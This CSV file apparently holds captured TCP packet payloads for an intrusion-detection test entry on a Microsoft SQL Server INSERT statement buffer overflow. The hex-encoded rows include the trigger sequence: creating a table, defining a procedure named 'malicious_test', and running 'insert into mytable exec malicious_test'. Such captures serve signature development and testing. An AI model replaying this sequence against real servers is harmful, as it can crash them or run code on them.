XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,"[[17 03 01 01 ]]L[[93 0C C1 0A ]]Hh[[05 ]]N[[E2 ]]f[[A0 0D F9 CD 02 ]]F[[AA ]]}*[[13 0C ]]3M[[8A CC F1 17 F9 85 ]]?[[B8 9F 0F C2 C7 F1 1D ]]4d[[B7 ]]M[[0F ]]9[[FA ]]+)[[95 ]][z[[A7 FF 1F ]]5Vp/[[1D 03 CF 0F ]]L[[0D 0C 07 ]]2[[D4 ]]-Yr$[[DF D8 03 B9 9F 0E 0F FD F2 ]]W>Q[[A2 ]]6e[[91 9E ]]JI[[08 E5 FA D2 A6 88 DD ]]d[[07 ]]{_[[D7 ]]&[[1A ]]&[[F7 AA ]]y[[E0 A5 0C ]]9[[07 A4 DE ]]&E[[CE D8 F1 ]]1[[1E 04 ]]A[[9D 94 ]]p[[E7 ]]9I[[D5 9A 81 A9 F2 ]]Le[[A0 11 C7 F3 ]].X~t[[0A 89 B5 87 ]]nz[[C9 EC D5 ]] k[[89 ]],H[[E1 ]]Em[[84 87 EA 85 FE ]]dp[[9D D3 ]]6=[[F2 98 ]]Nc[[F1 B6 DD 90 DB AC ]]R[[F9 BA ]].[[AC B6 8B CF D7 99 B0 86 ]]p[[B7 BC 0B ]]WA[[DB A9 ]]-8V[[0D 91 ]]@QNa[[D6 14 ]]:[[B5 ]]q[[95 EB ]]@[[1B 11 ]]""[[E4 FA ]]/[[DC ]]N9\[[A6 ]]k[[02 ]]![[1D FF B2 F9 AC E9 ]]_[[CA E8 ]]gpe[[FB ]]f[[B1 ]]]g][[A0 9A CA 09 ]]7[[F1 C2 ]]e[[BC ]]\w[[F7 FC E8 99 C2 DB ]]r[[D3 ]]`[[19 ]]ac[[0B ]]oc[[F3 ]]d&[[1D E5 ]];U[[A6 06 ]]R[[E4 C7 ]]%1[[8B ]]G^[[1D ]]_8[[80 ]]]#[[E7 ]]{[[1A FA ]]@[[18 CD C0 ]]n[[A6 B6 B9 ]]sG[[8C 9D 1B D9 89 85 98 ]]""O\[[00 89 CD 86 ]]J[[B4 0A 95]]"
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[01 01 03 ]]@[[00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]R[[00 ]]O[[00 ]]W[[00 ]]C[[00 ]]O[[00 ]]U[[00 ]]N[[00 ]]T[[00 ]] [[00 ]]0[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]T[[00 ]]E[[00 ]]X[[00 ]]T[[00 ]]S[[00 ]]I[[00 ]]Z[[00 ]]E[[00 ]] [[00 ]]2[[00 ]]1[[00 ]]4[[00 ]]7[[00 ]]4[[00 ]]8[[00 ]]3[[00 ]]6[[00 ]]4[[00 ]]7[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]N[[00 ]]O[[00 ]]C[[00 ]]O[[00 ]]U[[00 ]]N[[00 ]]T[[00 ]] [[00 ]]O[[00 ]]F[[00 ]]F[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]C[[00 ]]O[[00 ]]N[[00 ]]C[[00 ]]A[[00 ]]T[[00 ]]_[[00 ]]N[[00 ]]U[[00 ]]L[[00 ]]L[[00 ]]_[[00 ]]Y[[00 ]]I[[00 ]]E[[00 ]]L[[00 ]]D[[00 ]]S[[00 ]]_[[00 ]]N[[00 ]]U[[00 ]]L[[00 ]]L[[00 ]] [[00 ]]O[[00 ]]N[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]A[[00 ]]R[[00 ]]I[[00 ]]T[[00 ]]H[[00 ]]A[[00 ]]B[[00 ]]O[[00 ]]R[[00 ]]T[[00 ]] [[00 ]]O[[00 ]]N[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]L[[00 ]]O[[00 ]]C[[00 ]]K[[00 ]]_[[00 ]]T[[00 ]]I[[00 ]]M[[00 ]]E[[00 ]]O[[00 ]]U[[00 ]]T[[00 ]] [[00 ]]-[[00 ]]1[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]Q[[00 ]]U[[00 ]]E[[00 ]]R[[00 ]]Y[[00 ]]_[[00 ]]G[[00 ]]O[[00 ]]V[[00 ]]E[[00 ]]R[[00 ]]N[[00 ]]O[[00 ]]R[[00 ]]_[[00 ]]C[[00 ]]O[[00 ]]S[[00 ]]T[[00 ]]_[[00 ]]L[[00 ]]I[[00 ]]M[[00 ]]I[[00 ]]T[[00 ]] [[00 ]]0[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]D[[00 ]]E[[00 ]]A[[00 ]]D[[00 ]]L[[00 ]]O[[00 ]]C[[00 ]]K[[00 ]]_[[00 ]]P[[00 ]]R[[00 ]]I[[00 ]]O[[00 ]]R[[00 ]]I[[00 ]]T[[00 ]]Y[[00 ]] [[00 ]]N[[00 ]]O[[00 ]]R[[00 ]]M[[00 ]]A[[00 ]]L[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]T[[00 ]]R[[00 ]]A[[00 ]]N[[00 ]]S[[00 ]]A[[00 ]]C[[00 ]]T[[00 ]]I[[00 ]]O[[00 ]]N[[00 ]] [[00 ]]I[[00 ]]S[[00 ]]O[[00 ]]L[[00 ]]A[[00 ]]T[[00 ]]I[[00 ]]O[[00 ]]N[[00 ]] [[00 ]]L[[00 ]]E[[00 ]]V[[00 ]]E[[00 ]]L[[00 ]] [[00 ]]R[[00 ]]E[[00 ]]A[[00 ]]D[[00 ]] [[00 ]]C[[00 ]]O[[00 ]]M[[00 ]]M[[00 ]]I[[00 ]]T[[00 ]]T[[00 ]]E[[00 ]]D[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]A[[00 ]]N[[00 ]]S[[00 ]]I[[00 ]]_[[00 ]]N[[00 ]]U[[00 ]]L[[00 ]]L[[00 ]]S[[00 ]] [[00 ]]O[[00 ]]N[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]A[[00 ]]N[[00 ]]S[[00 ]]I[[00 ]]_[[00 ]]N[[00 ]]U[[00 ]]L[[00 ]]L[[00 ]]_[[00 ]]D[[00 ]]F[[00 ]]L[[00 ]]T[[00 ]]_[[00 ]]O[[00 ]]N[[00 ]] [[00 ]]O[[00 ]]N[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]A[[00 ]]N[[00 ]]S[[00 ]]I[[00 ]]_[[00 ]]P[[00 ]]A[[00 ]]D[[00 ]]D[[00 ]]I[[00 ]]N[[00 ]]G[[00 ]] [[00 ]]O[[00 ]]N[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]A[[00 ]]N[[00 ]]S[[00 ]]I[[00 ]]_[[00 ]]W[[00 ]]A[[00 ]]R[[00 ]]N[[00 ]]I[[00 ]]N[[00 ]]G[[00 ]]S[[00 ]] [[00 ]]O[[00 ]]N[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]C[[00 ]]U[[00 ]]R[[00 ]]S[[00 ]]O[[00 ]]R[[00 ]]_[[00 ]]C[[00 ]]L[[00 ]]O[[00 ]]S[[00 ]]E[[00 ]]_[[00 ]]O[[00 ]]N[[00 ]]_[[00 ]]C[[00 ]]O[[00 ]]M[[00 ]]M[[00 ]]I[[00 ]]T[[00 ]] [[00 ]]O[[00 ]]F[[00 ]]F[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]I[[00 ]]M[[00 ]]P[[00 ]]L[[00 ]]I[[00 ]]C[[00 ]]I[[00 ]]T[[00 ]]_[[00 ]]T[[00 ]]R[[00 ]]A[[00 ]]N[[00 ]]S[[00 ]]A[[00 ]]C[[00 ]]T[[00 ]]I[[00 ]]O[[00 ]]N[[00 ]]S[[00 ]] [[00 ]]O[[00 ]]F[[00 ]]F[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]T[[00 ]] [[00 ]]Q[[00 ]]U[[00 ]]O[[00 ]]T[[00 ]]E[[00 ]]D[[00 ]]_[[00 ]]I[[00 ]]D[[00 ]]E[[00 ]]N[[00 ]]T[[00 ]]I[[00 ]]F[[00 ]]I[[00 ]]E[[00 ]]R[[00 ]] [[00 ]]O[[00 ]]N[[00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[01 01 00 84 00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]s[[00 ]]e[[00 ]]l[[00 ]]e[[00 ]]c[[00 ]]t[[00 ]] [[00 ]]@[[00 ]]@[[00 ]]s[[00 ]]p[[00 ]]i[[00 ]]d[[00 ]] [[00 ]]s[[00 ]]e[[00 ]]l[[00 ]]e[[00 ]]c[[00 ]]t[[00 ]] [[00 ]]S[[00 ]]E[[00 ]]R[[00 ]]V[[00 ]]E[[00 ]]R[[00 ]]P[[00 ]]R[[00 ]]O[[00 ]]P[[00 ]]E[[00 ]]R[[00 ]]T[[00 ]]Y[[00 ]]([[00 ]]'[[00 ]]P[[00 ]]r[[00 ]]o[[00 ]]d[[00 ]]u[[00 ]]c[[00 ]]t[[00 ]]L[[00 ]]e[[00 ]]v[[00 ]]e[[00 ]]l[[00 ]]'[[00 ]])[[00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[01 01 00 ]]J[[00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]s[[00 ]]e[[00 ]]t[[00 ]] [[00 ]]a[[00 ]]n[[00 ]]s[[00 ]]i[[00 ]]_[[00 ]]p[[00 ]]a[[00 ]]d[[00 ]]d[[00 ]]i[[00 ]]n[[00 ]]g[[00 ]] [[00 ]]o[[00 ]]f[[00 ]]f[[00 0D 00 0A 00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[01 01 00 ]]n[[00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]c[[00 ]]r[[00 ]]e[[00 ]]a[[00 ]]t[[00 ]]e[[00 ]] [[00 ]]t[[00 ]]a[[00 ]]b[[00 ]]l[[00 ]]e[[00 ]] [[00 ]]m[[00 ]]y[[00 ]]t[[00 ]]a[[00 ]]b[[00 ]]l[[00 ]]e[[00 ]] [[00 ]]([[00 ]]t[[00 ]]i[[00 ]]t[[00 ]]l[[00 ]]e[[00 ]] [[00 ]]c[[00 ]]h[[00 ]]a[[00 ]]r[[00 ]]([[00 ]]3[[00 ]]0[[00 ]]0[[00 ]])[[00 ]])[[00 0D 00 0A 00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[01 01 00 ]]d[[00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]i[[00 ]]n[[00 ]]s[[00 ]]e[[00 ]]r[[00 ]]t[[00 ]] [[00 ]]i[[00 ]]n[[00 ]]t[[00 ]]o[[00 ]] [[00 ]]m[[00 ]]y[[00 ]]t[[00 ]]a[[00 ]]b[[00 ]]l[[00 ]]e[[00 ]] [[00 ]]v[[00 ]]a[[00 ]]l[[00 ]]u[[00 ]]e[[00 ]]s[[00 ]] [[00 ]]([[00 ]]n[[00 ]]u[[00 ]]l[[00 ]]l[[00 ]])[[00 0D 00 0A 00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,"[[01 01 00 DC 00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]c[[00 ]]r[[00 ]]e[[00 ]]a[[00 ]]t[[00 ]]e[[00 ]] [[00 ]]p[[00 ]]r[[00 ]]o[[00 ]]c[[00 ]]e[[00 ]]d[[00 ]]u[[00 ]]r[[00 ]]e[[00 ]] [[00 ]]m[[00 ]]a[[00 ]]l[[00 ]]i[[00 ]]c[[00 ]]i[[00 ]]o[[00 ]]u[[00 ]]s[[00 ]]_[[00 ]]t[[00 ]]e[[00 ]]s[[00 ]]t[[00 ]] [[00 ]]a[[00 ]]s[[00 0D 00 0A 00 ]]b[[00 ]]e[[00 ]]g[[00 ]]i[[00 ]]n[[00 0D 00 0A 00 ]] [[00 ]] [[00 ]]s[[00 ]]e[[00 ]]l[[00 ]]e[[00 ]]c[[00 ]]t[[00 ]] [[00 ]]i[[00 ]]s[[00 ]]n[[00 ]]u[[00 ]]l[[00 ]]l[[00 ]]([[00 ]]t[[00 ]]i[[00 ]]t[[00 ]]l[[00 ]]e[[00 ]],[[00 ]] [[00 ]]'[[00 ]]A[[00 ]]A[[00 ]]A[[00 ]]A[[00 ]]A[[00 ]]A[[00 ]]'[[00 ]])[[00 ]] [[00 ]]f[[00 ]]r[[00 ]]o[[00 ]]m[[00 ]] [[00 ]]m[[00 ]]y[[00 ]]t[[00 ]]a[[00 ]]b[[00 ]]l[[00 ]]e[[00 0D 00 0A 00 ]]e[[00 ]]n[[00 ]]d[[00 0D 00 0A 00]]"
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[01 01 00 ]]p[[00 00 01 00 16 00 00 00 12 00 00 00 02 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]i[[00 ]]n[[00 ]]s[[00 ]]e[[00 ]]r[[00 ]]t[[00 ]] [[00 ]]i[[00 ]]n[[00 ]]t[[00 ]]o[[00 ]] [[00 ]]m[[00 ]]y[[00 ]]t[[00 ]]a[[00 ]]b[[00 ]]l[[00 ]]e[[00 ]] [[00 ]]e[[00 ]]x[[00 ]]e[[00 ]]c[[00 ]] [[00 ]]m[[00 ]]a[[00 ]]l[[00 ]]i[[00 ]]c[[00 ]]i[[00 ]]o[[00 ]]u[[00 ]]s[[00 ]]_[[00 ]]t[[00 ]]e[[00 ]]s[[00 ]]t[[00 0D 00 0A 00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,"[[04 01 00 ]]+[[00 00 01 00 00 00 1A 00 06 01 00 ]] [[00 01 02 00 ]]![[00 01 03 00 ]]""[[00 00 04 00 ]]""[[00 01 FF 09 00 0B E2 00 00 00 00 00]]"
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,"[[12 01 02 ]]b[[00 00 00 00 16 03 01 02 ]]U[[02 00 00 ]]F[[03 01 ]]Hs[[E5 E7 ]]e[[D5 B7 ]]~p[[96 BE ]]R[[BE BF ]]~[[82 ]]X6[[BC ]]d[[8F ]]1[[F5 ]]L[[9F ]]>[[13 1A 0F ]]g&[[97 ]] 7[[1D 00 00 ]],[[9E DF ]] [[A8 E1 9D DB ]]n[[DC F2 ]]7[[FC ]]C.[[17 A6 ]].{%m[[0A A9 A2 ]]9[[9A ]]\[[A0 00 04 00 0B 00 02 03 00 02 00 00 01 FD ]]0[[82 01 F9 ]]0[[82 01 ]]b[[A0 03 02 01 02 02 10 E4 ]]+G[[F6 ]]g[[1A 00 83 ]]J[[9D E3 ]]Z[[89 ]]>[[A0 ]]-0[[0D 06 09 ]]*[[86 ]]H[[86 F7 0D 01 01 05 05 00 ]]0;1907[[06 03 ]]U[[04 03 1E ]]0[[00 ]]S[[00 ]]S[[00 ]]L[[00 ]]_[[00 ]]S[[00 ]]e[[00 ]]l[[00 ]]f[[00 ]]_[[00 ]]S[[00 ]]i[[00 ]]g[[00 ]]n[[00 ]]e[[00 ]]d[[00 ]]_[[00 ]]F[[00 ]]a[[00 ]]l[[00 ]]l[[00 ]]b[[00 ]]a[[00 ]]c[[00 ]]k0[[1E 17 0D ]]080708150805Z[[17 0D ]]380708150805Z0;1907[[06 03 ]]U[[04 03 1E ]]0[[00 ]]S[[00 ]]S[[00 ]]L[[00 ]]_[[00 ]]S[[00 ]]e[[00 ]]l[[00 ]]f[[00 ]]_[[00 ]]S[[00 ]]i[[00 ]]g[[00 ]]n[[00 ]]e[[00 ]]d[[00 ]]_[[00 ]]F[[00 ]]a[[00 ]]l[[00 ]]l[[00 ]]b[[00 ]]a[[00 ]]c[[00 ]]k0[[81 9F ]]0[[0D 06 09 ]]*[[86 ]]H[[86 F7 0D 01 01 01 05 00 03 81 8D 00 ]]0[[81 89 02 81 81 00 CC ]]he[[02 ]]z[[FE D8 ]]p|+[[B4 82 ]]z8[[C2 ]]:[[1B 91 EF AA ]]b[[91 15 ]]gBRU[[DD ]]C[[BF ]]}[[F7 ]]jK[[8C ]]x[[FA 00 ]]3[[F9 ]]H[[BD 80 D1 ]]l[[01 AB ]]q[[F3 D9 E2 C3 ]]^[[9A E4 D8 ]]A[[D4 19 ]]j[[B1 ]]O[[08 ]]q[[AE ]]J[[8C A6 CF ]]VJ[[04 F0 ]]m'2[[8B B0 ]]D[[1A ]]FR[[86 ]]`[[83 ]]]T([[15 ]]?[[1C ]]PgZU[[B5 C0 ]]H[[CE B3 ]]/[[DF ]]R[[BA 82 ]]AM[[D3 10 ]];[[EB ]]Lx[[D1 ]]q^[[C8 ]]J[[93 C6 ]]-[[93 BD 16 1E ]]<[[[02 03 01 00 01 ]]0[[0D 06 09 ]]*[[86 ]]H[[86 F7 0D 01 01 05 05 00 03 81 81 00 ]]G>[[10 18 0A ]]B[[BB D4 81 ]]B[[0E A1 9B A5 E0 A4 AE 0E F3 DB ]]K[[B4 EE 80 12 BF EE 0E ]]Y[[E4 03 9F 08 ED B3 D0 ]]y[[81 ]]|[[A3 CD B7 A4 F5 15 F5 ]]e[[09 D6 F2 DD A0 ]]}[[94 EC ]]X[[F3 B4 ]]<[[BD D2 CC 05 ]]}[[AF 90 D7 ]]*[OZa[[D6 ]]][[D1 1E ]]T%FfF [[B7 ]]$0T[[BE ]]Q[[90 A5 ]]l][[EF 02 ]]G![[E2 D7 83 ]]_[[C8 ]]=[[FC ]]6[[A6 ]]A[[8C FA 1C ]]{[[09 ]]\[[86 ]]N$[[EC ]]-#[[D3 ]]|U[[E7 9A 00 ]]UqUs[[0E 00 00 00]]"
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,"[[12 01 00 ]]3[[00 00 00 00 14 03 01 00 01 01 16 03 01 00 ]] [[E2 ]]zc[[1F 9D ]]r[[BD D4 ]]-[[C9 BD 00 DF 1D ]]c[[9E ]]A[[D5 ]]{T[[18 9E BE CE BF 92 C5 B1 82 ]]""[[9F DD]]"
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[04 01 01 99 00 ]]7[[01 00 E3 1B 00 01 06 ]]m[[00 ]]a[[00 ]]s[[00 ]]t[[00 ]]e[[00 ]]r[[00 06 ]]m[[00 ]]a[[00 ]]s[[00 ]]t[[00 ]]e[[00 ]]r[[00 AB ]]t[[00 ]]E[[16 00 00 02 00 ]]%[[00 ]]C[[00 ]]h[[00 ]]a[[00 ]]n[[00 ]]g[[00 ]]e[[00 ]]d[[00 ]] [[00 ]]d[[00 ]]a[[00 ]]t[[00 ]]a[[00 ]]b[[00 ]]a[[00 ]]s[[00 ]]e[[00 ]] [[00 ]]c[[00 ]]o[[00 ]]n[[00 ]]t[[00 ]]e[[00 ]]x[[00 ]]t[[00 ]] [[00 ]]t[[00 ]]o[[00 ]] [[00 ]]'[[00 ]]m[[00 ]]a[[00 ]]s[[00 ]]t[[00 ]]e[[00 ]]r[[00 ]]'[[00 ]].[[00 0E ]]V[[00 ]]R[[00 ]]T[[00 ]]V[[00 ]]M[[00 ]]-[[00 ]]W[[00 ]]I[[00 ]]N[[00 ]]2[[00 ]]K[[00 ]]S[[00 ]]R[[00 ]]V[[00 00 01 00 00 00 E3 08 00 07 05 09 04 D0 00 ]]4[[00 E3 17 00 02 0A ]]u[[00 ]]s[[00 ]]_[[00 ]]e[[00 ]]n[[00 ]]g[[00 ]]l[[00 ]]i[[00 ]]s[[00 ]]h[[00 00 AB ]]x[[00 ]]G[[16 00 00 01 00 ]]'[[00 ]]C[[00 ]]h[[00 ]]a[[00 ]]n[[00 ]]g[[00 ]]e[[00 ]]d[[00 ]] [[00 ]]l[[00 ]]a[[00 ]]n[[00 ]]g[[00 ]]u[[00 ]]a[[00 ]]g[[00 ]]e[[00 ]] [[00 ]]s[[00 ]]e[[00 ]]t[[00 ]]t[[00 ]]i[[00 ]]n[[00 ]]g[[00 ]] [[00 ]]t[[00 ]]o[[00 ]] [[00 ]]u[[00 ]]s[[00 ]]_[[00 ]]e[[00 ]]n[[00 ]]g[[00 ]]l[[00 ]]i[[00 ]]s[[00 ]]h[[00 ]].[[00 0E ]]V[[00 ]]R[[00 ]]T[[00 ]]V[[00 ]]M[[00 ]]-[[00 ]]W[[00 ]]I[[00 ]]N[[00 ]]2[[00 ]]K[[00 ]]S[[00 ]]R[[00 ]]V[[00 00 01 00 00 00 AD ]]6[[00 01 ]]r[[09 00 02 16 ]]M[[00 ]]i[[00 ]]c[[00 ]]r[[00 ]]o[[00 ]]s[[00 ]]o[[00 ]]f[[00 ]]t[[00 ]] [[00 ]]S[[00 ]]Q[[00 ]]L[[00 ]] [[00 ]]S[[00 ]]e[[00 ]]r[[00 ]]v[[00 ]]e[[00 ]]r[[00 00 00 00 00 09 00 0B E2 E3 13 00 04 04 ]]4[[00 ]]0[[00 ]]9[[00 ]]6[[00 04 ]]4[[00 ]]0[[00 ]]9[[00 ]]6[[00 FD 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[04 01 00 CB 00 ]]7[[01 00 FD 01 00 BD 00 00 00 00 00 00 00 00 00 FD 01 00 BE 00 00 00 00 00 00 00 00 00 FD 01 00 BA 00 00 00 00 00 00 00 00 00 FD 01 00 B9 00 00 00 00 00 00 00 00 00 FD 01 00 B9 00 00 00 00 00 00 00 00 00 FD 01 00 F9 00 00 00 00 00 00 00 00 00 FD 01 00 F9 00 00 00 00 00 00 00 00 00 FD 01 00 F9 00 00 00 00 00 00 00 00 00 FD 01 00 F9 00 00 00 00 00 00 00 00 00 FD 01 00 B9 00 00 00 00 00 00 00 00 00 FD 01 00 B9 00 00 00 00 00 00 00 00 00 FD 01 00 B9 00 00 00 00 00 00 00 00 00 FD 01 00 B9 00 00 00 00 00 00 00 00 00 FD 01 00 BA 00 00 00 00 00 00 00 00 00 FD 00 00 BA 00 00 00 00 00 00 00 00 00]]
FSC20080708-04_Microsoft_SQL_Server_INSERT_Statement_Buffer_Overflow.xml,Microsoft SQL Server INSERT Statement Buffer Overflow,"There exists a buffer overflow in Microsoft SQL Server. The vulnerability is due improper input validation when processing INSERT statements. A remote authenticated attacker can exploit this vulnerability by sending a specially crafted SQL statement to the target server, potentially causing arbitrary code injection and execution with the privileges of the affected process.",MS-SQL-S,TCP,[[04 01 00 ]]S[[00 ]]7[[01 00 81 01 00 00 00 00 00 ]] [[00 ]]4[[00 D1 ]]7[[00 FD 11 00 C1 00 01 00 00 00 00 00 00 00 81 01 00 00 00 00 00 ]]![[00 ]]bI[[1F 00 00 00 D1 0F 00 00 00 E7 07 09 04 D0 00 ]]4[[00 01 ]]S[[00 ]]P[[00 ]]2[[00 FD 10 00 C1 00 01 00 00 00 00 00 00 00]]
